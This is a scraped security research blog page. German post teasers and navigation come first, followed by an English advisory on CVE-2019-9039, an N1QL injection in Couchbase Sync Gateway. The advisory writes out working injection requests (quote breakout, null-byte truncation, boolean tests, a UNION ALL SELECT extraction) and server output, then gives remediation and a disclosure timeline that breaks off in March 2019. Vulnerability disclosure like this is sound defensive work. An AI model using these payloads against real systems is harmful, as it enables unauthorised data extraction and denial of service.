## [BSI-Grundschutz-Krypto-Kataster: Ein Baustein für die Aufrechterhaltung einer sicheren IT-Infrastruktur](https://research.hisolutions.com/2024/11/bsi-grundschutz-krypto-kataster-ein-baustein-fuer-die-aufrechterhaltung-einer-sicheren-it-infrastruktur/)

In der heutigen digitalen Welt ist die Sicherheit von IT-Umgebungen von entscheidender Bedeutung. Das Bundesamt für Sicherheit in der Informationstechnik (BSI) hat mit dem IT-Grundschutz ein umfassendes Rahmenwerk geschaffen, das Organisationen beim Schutz ihrer IT-Infrastruktur unterstützt. Seit der Edition 2023 wurde der Prozess-Baustein CON.1 (Kryptokonzept) um die Standard-Anforderungen zur Erstellung eines Krypto-Katasters (A15 & A19) erweitert. Hiermit schafft das BSI eine Grundlage für Krypto-Agilität, ohne es explizit so zu nennen.  Was ist das Krypto-Kataster nach BSI-Grundschutz?  Ein Krypto-Kataster ist ein […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/11/2024-11_Digest_IT-Sicherheit_Blog.png)](https://research.hisolutions.com/2024/11/perimeter-defense/ "Perimeter Defense")

[14. November 2024](https://research.hisolutions.com/2024/11/perimeter-defense/)[Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/), [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/)
## [Perimeter Defense](https://research.hisolutions.com/2024/11/perimeter-defense/)

Zuletzt häuften sich erneut herstellerübergreifend die Sicherheitslücken in Firewalls, also gerade in den Geräten, die die Umgebung eigentlich schützen sollten. Die Rolle der Perimeterverteidigung wird nunmehr infrage gestellt und Zero Trust nicht nur als neues Buzzword verwendet, sondern auch als innovative Lösung der Hersteller versprochen. Das Konzept dahinter ist aber gar nicht so innovativ: Bereits 1994 wurde „Zero Trust“ im Rahmen einer Dissertation definiert. Über die Jahre finden sich viele weitere Talks und Beiträge, die gegen Firewalls als alleinige Sicherheitskonzepte […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/10/2024-10_Digest_IT-Sicherheit_Blog.png)](https://research.hisolutions.com/2024/10/wsus-mit-oder-ohne-ende/ "WSUS: mit oder ohne Ende?")

[17. Oktober 2024](https://research.hisolutions.com/2024/10/wsus-mit-oder-ohne-ende/)[Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/)
## [WSUS: mit oder ohne Ende?](https://research.hisolutions.com/2024/10/wsus-mit-oder-ohne-ende/)

Im September sorgte eine Ankündigung von Microsoft bei Windows-Server-Administratoren für Unruhe: Die WSUS-Funktion sei jetzt „deprecated“. Über WSUS verteilen viele Organisationen die System- und Anwendungsupdates von Microsoft. Das spart nicht nur Download-Bandbreite, wenn das Update nur einmal in die Organisation geladen wird, sondern ermöglicht das gezielte Freigeben und Zurückhalten von Updates. Soll damit jetzt Schluss sein? Schaut man sich die ursprüngliche Nachricht näher an, geht das alles doch nicht so schnell. Tatsächlich wurde der Informationspost von Microsoft selbst auch noch […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/09/Lorenz.png)](https://research.hisolutions.com/2024/10/sap-auf-allzeithoch-draengt-kunden-in-die-cloud/ "SAP auf Allzeithoch Drängt Kunden in die Cloud ")

[16. Oktober 202416. Oktober 2024](https://research.hisolutions.com/2024/10/sap-auf-allzeithoch-draengt-kunden-in-die-cloud/)[Allgemein](https://research.hisolutions.com/category/allgemein/)
## [SAP auf Allzeithoch Drängt Kunden in die Cloud](https://research.hisolutions.com/2024/10/sap-auf-allzeithoch-draengt-kunden-in-die-cloud/)

Von Lorenz Müller, HiSolutions AG  SAP strukturiert weiterhin massiv um: Für die SAP Business Suite ist die Nachfolgerin SAP S/4HANA längst da. Das Ende der Mainstream-Wartung naht, die Migration scheint unausweichlich. Und mit der Fokussierung auf die Cloud stellt sich SAP selbst neu auf.  Die Dynamik, mit der SAP seine Konzern- und Produktpolitik betreibt, beeindruckt. On-Premise-Angebote wurden drastisch verteuert – auch, um SAP-Kunden in die Cloud zu drängen. Mit dem Private Cloud-Komplettpaket RISE with SAP und mit Grow with SAP für […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/09/2024-09_Digest_IT-Sicherheit_Blog.png)](https://research.hisolutions.com/2024/09/sind-17-jahre-noch-echtzeit/ "Sind 17 Jahre noch Echtzeit?")

[26. September 2024](https://research.hisolutions.com/2024/09/sind-17-jahre-noch-echtzeit/)[Allgemein](https://research.hisolutions.com/category/allgemein/)
## [Sind 17 Jahre noch Echtzeit?](https://research.hisolutions.com/2024/09/sind-17-jahre-noch-echtzeit/)

Linux und Echtzeit – für einige ist das ein Widerspruch, während andere schon seit Jahren die Real-Time-Linux-Patches nutzen. Hintergrund ist, dass der Hauptzweig des Linux-Kernel über die Jahre zwar viele Änderungen für Echtzeitfähigkeit erfahren hat, aber ohne die separat gepflegte Patch-Sammlung harte Echtzeitanforderungen nicht garantiert werden konnten. Im September ist jetzt ein großer Teil dieser Patches in den Hauptzweig übernommen worden und damit ein viele Jahre währender Prozess nah ans Ziel gekommen. Es gibt allerdings immer noch Spezialfälle, in denen […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/08/2024-08_Digest_IT-Sicherheit_Blog.png)](https://research.hisolutions.com/2024/08/bewerbungsgespraech-mit-einem-angreifer/ "Bewerbungsgespräch mit einem Angreifer")

[8. August 2024](https://research.hisolutions.com/2024/08/bewerbungsgespraech-mit-einem-angreifer/)[Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/)
## [Bewerbungsgespräch mit einem Angreifer](https://research.hisolutions.com/2024/08/bewerbungsgespraech-mit-einem-angreifer/)

Das Sicherheitsunternehmen KnowB4 hat einen Fall öffentlich gemacht, bei dem sich ein neuer Mitarbeiter als nordkoreanischer Spion entpuppte. Enttarnt wurde er gleich am ersten Tag, nachdem er als Remote-Arbeiter zum ersten Mal seinen zugesandten Rechner startete und sofort eine Malware installieren wollte. Im Nachhinein fielen dann auch weitere Ungereimtheiten bei der Bewerbung auf, die das Sicherheitsunternehmen zur Warnung anderer Unternehmen in seinem Blog beschreibt. Im Juni hatte das Wall Street Journal bereits ausführlicher über diese Gefahr berichtet und verschiedene andere […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/07/HiSolutions_Reasearch_Schwachstelle-Hotel_Beitragsbild.png)](https://research.hisolutions.com/2024/07/schwachstelle-oeffnet-tueren-in-mehr-als-3-000-hotels/ "Schwachstelle öffnet Türen in mehr als 3.000 Hotels")

[25. Juli 202426. Juli 2024](https://research.hisolutions.com/2024/07/schwachstelle-oeffnet-tueren-in-mehr-als-3-000-hotels/)[Advisories](https://research.hisolutions.com/category/advisories/), [Allgemein](https://research.hisolutions.com/category/allgemein/), [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/), [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/)
## [Schwachstelle öffnet Türen in mehr als 3.000 Hotels](https://research.hisolutions.com/2024/07/schwachstelle-oeffnet-tueren-in-mehr-als-3-000-hotels/)

Es mag bequem klingen: Die Zimmertür im Hotel lässt sich ganz ohne Schlüssel oder Karte vom Smartphone aus entriegeln. Doch was passiert, wenn die Logik eines solchen Systems nicht ausreichend abgesichert ist?

Zimmertüren von Hotels aus über 25 Ländern ließen sich mit einer neu entdeckten Schwachstelle öffnen. Bequem? Ja, über das Internet und ohne Zugangsdaten. Dazu konnten sämtliche Reservierungsinformationen (u. a. Name, E-Mail, Reservierungszeitraum und Raumnummer) eingesehen werden. Doch wie kam es dazu?

## Seitennummerierung der Beiträge

1
[2](https://research.hisolutions.com/page/2/)
…
[14](https://research.hisolutions.com/page/14/)
[>](https://research.hisolutions.com/page/2/)

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_718bb7b8_20250121_012505.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Schlagwort: Injection

[![](https://research.hisolutions.com/wp-content/uploads/2019/06/Couchbase_Inc._official_logo.png)](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/ "N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039")

[21. Juni 201926. Juni 2023](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)

Within the scope of a recent penetration test, HiSolutions security consultants encountered a Couchbase Sync Gateway and discovered a previously unknown, high-impact injection vulnerability (CVE-2019-9039).

**Background
Information**

The Couchbase Sync Gateway is a product
developed by Couchbase Inc. as part of their mobile product portfolio. It is
used to connect web, mobile, and IoT apps (Couchbase Lite) to the backend
database (Couchbase Server). The publically accessible Sync Gateway synchronizes
the data with the internal backend database servers and employs various
security and integration features.

Couchbase uses a database query language called *N1QL* (<https://www.couchbase.com/products/n1ql> ) (pronounced “nickel”). *N1QL* extends SQL for JSON. It
combines the syntax of traditional SQL with the benefits and flexibility of
NoSQL databases.

From a security standpoint, N1QL is comparatively
unexplored. SQL injections are a well-known and broadly explored security risk
for traditional SQL databases. With increased use of NoSQL databases, NoSQL injection
has become a more widely known topic as well. For both vulnerabilities,
numerous tools, articles and presentations exist that detail every aspect of
exploitation.

**N1QL
Injections**

A 2015 blog post (<https://blog.couchbase.com/couchbase-and-n1ql-security-centeredgesoftware/>) discusses various aspects of N1QL injections. N1QL is claimed to be more
resistant to injection attacks than traditional SQL. This is due to the
following syntactic differences:

* Query stacking is not possible
  in N1QL. That is, terminating a previous query with a semicolon and appending
  another query will result in an invalid syntax error in N1QL.
* N1QL does not allow commenting
  out just the remainder of a line. N1QL only allows C-style comment blocks (/\*
  comment \*/). This prevents an attacker from terminating a query by inserting
  “/\*” or “–“ at the injection point.

The blog post also mentions generic advice for
preventing injections. Apart from that, information regarding N1QL injections
is very sparse.

**The vulnerability**

HiSolutions consultants discovered that the Couchbase
Sync Gateway in combination with a Couchbase Server is affected by a previously
undisclosed N1QL-injection vulnerability in the REST API. An attacker with
access to the public REST API can insert additional N1QL statements through the
parameters “startkey” and “endkey” of the “\_all\_docs” endpoint.

The following request triggers an error:

[https://host:port/{db}/\_all\_docs?startkey=1%271&endkey=](https://host:port/%7Bdb%7D/_all_docs?startkey=1%271&endkey=)

The client will receive the following error statement
indicating a N1QL error:

```
{"rows":[
{"error":"Internal Server Error","reason":"Internal error: [3000] syntax error - at 1"}
```

On a server with the standard installation of Couchbase
Server and Couchbase Sync Gateway, the following error will appear in the
logfile:

```
2019-02-15T14:00:51.892+01:00 [WRN] Error when querying index using
statement: [SELECT META(`test-getting-started`).id as id,
meta(`test-getting-started`).xattrs._sync.rev as r,
meta(`test-getting-started`).xattrs._sync.sequence as s,
meta(`test-getting-started`).xattrs._sync.channels as c FROM
`test-getting-started` WHERE meta(`test-getting-started`).xattrs._sync.sequence
> 0 AND META(`test-getting-started`).id NOT LIKE '\\_sync:%' AND
meta(`test-getting-started`).xattrs._sync IS NOT MISSING AND
(meta(`test-getting-started`).xattrs._sync.flags IS MISSING OR
BITTEST(meta(`test-getting-started`).xattrs._sync.flags,1) = false) AND
META(`test-getting-started`).id >= '1'1' ORDER BY META(`test-getting-started`).id] --
base.(*CouchbaseBucketGoCB).Query() at bucket_n1ql.go:63
```

The error (injection point at ‚1‘1′ near the bottom) shows that it is possible to break out of the original query and insert additional N1QL code. An additional character after the apostrophe seems to be required to trigger the error.

Furthermore, it is possible to end the current query
and thereby skip the rest of the original query by inserting a null byte at the
end of the manipulated parameter value.

The insertion of an additional comparison can be used
to validate the injection. When inserting an additional requirement that is
always true (“AND 1=1”), the original results are returned:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d1%00&endkey=
```

Inserting a statement that always evaluates to false (“AND
1=0”) yields no results:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d0%00&endkey=
```

The following request can be used to extract
additional information from a default installation:

```
/{db}/_all_docs?startkey=123%27%20UNION%20ALL%20SELECT
%20TOSTRING(BASE64_DECODE("U1FMLUl
uamVjdGlvbg=="))%20as%20id%3b%00&endkey=
```

The inserted N1QL statement “UNION ALL SELECT
TOSTRING(BASE64\_DECODE(„U1FMLUluamVjdGlvbg==“)) as id” adds the
following line to the output and shows that N1QL functions and queries are
evaluated:

```
{"rows":[
{"key":"SQL-Injection","id":"SQL-Injection","value":{"rev":""}}
...
```

The same injection works for the parameter “endkey”.

Additional modification of the query seems to be
required to make UNION-injections work when channels and users are set up for
the database. Data extraction methods that rely on comparisons will work as shown.

**Impact:**

An attacker with access to the public REST API is able
to issue additional N1QL statements and extract sensitive data or call
arbitrary N1QL functions. By issuing nested queries with CPU-intensive
operations, he might be able to cause increased resource usage and denial of
service conditions.

**Remediation:**

Traditional remediations for SQL injection vulnerabilities
also apply to N1QL. Features like parameterized N1QL queries should be used to
prevent the injection of N1QL statements into the original query.

As the vulnerability exists in the default Couchbase
Sync Gateway, an update will fix the problem. HiSolutions has responsibly reported
the issue to the vendor. The fix is available in Sync Gateway v2.5 as well as
in v2.1.3.

Short-term remediation can be implemented by blocking
all requests containing “startkey” or “endkey” on the web-interface.

**[Responsible Disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) Timeline**

15.02.2019 – HiSolution initially notifies security@couchbase.com with vulnerability details and the internal
responsible disclosure guideline.

20.02.2019 – Couchbase acknowledges the vulnerability
and states that an engineering team is working on the issue. Couchbase offers
to help with the CVE request to [MITRE](https://research.hisolutions.com/2023/03/medientipp-maerz-2023/).

23.02.2019 – HiSolutions inquires whether the
engineering team was able to reproduce the issue and requests an ETA for a
patch. HiSolutions notifies Couchbase that a CVE number was requested.

23.02.2019 – MITRE assigns CVE-2019-9039 for the
vulnerability.

26.02.2019 – Couchbase sends an email to HiSolutions with
their assessment of the CVSS (<https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L>). Couchbase states in this email that a patch is under
development and that they will follow up with an ETA. Couchbase requests the
CVE number.

26.02.2019 – HiSolutions sends the CVE number to
Couchbase and questions the assessed CVSS. User interaction should be “none”
from HiSolutions perspective (CVSS v3 Vector: [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)).

26.02.2019 – Couchbase explains their assessment of
the CVSS and states that they will follow up an ETA for the patch.

25.03.2019 – HiSolutions inquires  if an ETA is available and explains the
assessment of the User Interaction CVSS vector.

